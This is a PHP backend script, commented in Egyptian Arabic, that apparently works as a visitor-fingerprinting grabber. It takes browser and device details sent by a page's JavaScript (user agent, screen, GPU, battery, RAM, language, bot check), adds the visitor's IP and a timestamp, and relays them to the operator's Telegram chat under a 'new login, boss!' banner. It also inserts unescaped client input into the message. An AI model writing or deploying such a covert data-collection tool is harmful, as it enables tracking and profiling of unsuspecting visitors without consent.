<?php
require_once 'config.php';
require_once 'telegram.php';

// استخراج البيانات اللي جاية من الجافاسكريبت
$json = file_get_contents('php://input');
$data = json_decode($json, true);

if ($data) {
    // جلب الـ IP الحقيقي (مهم جداً عشان Railway)
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'غير معروف';
    $ip = explode(',', $ip)[0]; // لو في أكتر من IP بناخد الأول
    
    // التوقيت الحالي
    date_default_timezone_set('Africa/Cairo');
    $time = date('Y-m-d h:i:s A');

    // تجهيز الرسالة بالمصري
    $msg = "🔍 <b>تسجيل دخول جديد يا ريس!</b>\n\n";
    $msg .= "🌐 <b>الـ IP:</b> <code>{$ip}</code>\n";
    $msg .= "🕐 <b>الوقت:</b> {$time}\n";
    $msg .= "💻 <b>المتصفح/النظام:</b> {$data['userAgent']}\n";
    $msg .= "📐 <b>الشاشة:</b> {$data['screen']}\n";
    $msg .= "🌍 <b>التوقيت الزمني:</b> {$data['tz']}\n";
    $msg .= "🗣️ <b>اللغة:</b> {$data['lang']}\n";
    $msg .= "🧠 <b>أنوية المعالج:</b> {$data['cores']}\n";
    $msg .= "💾 <b>الرام التقريبي:</b> {$data['ram']} GB\n";
    $msg .= "🔋 <b>البطارية:</b> {$data['battery']}\n";
    $msg .= "⚡ <b>شغال ع الشاحن؟:</b> {$data['charging']}\n";
    $msg .= "🎮 <b>كارت الشاشة (GPU):</b> {$data['gpu']}\n";
    $msg .= "🤖 <b>شكله بوت؟:</b> {$data['webdriver']}\n\n";
    $msg .= "—\n";
    $msg .= "👨‍💻 <a href='https://t.me/" . DEV_USERNAME . "'>" . DEV_USERNAME . "</a>";

    sendTelegramMessage($msg);
}
?>
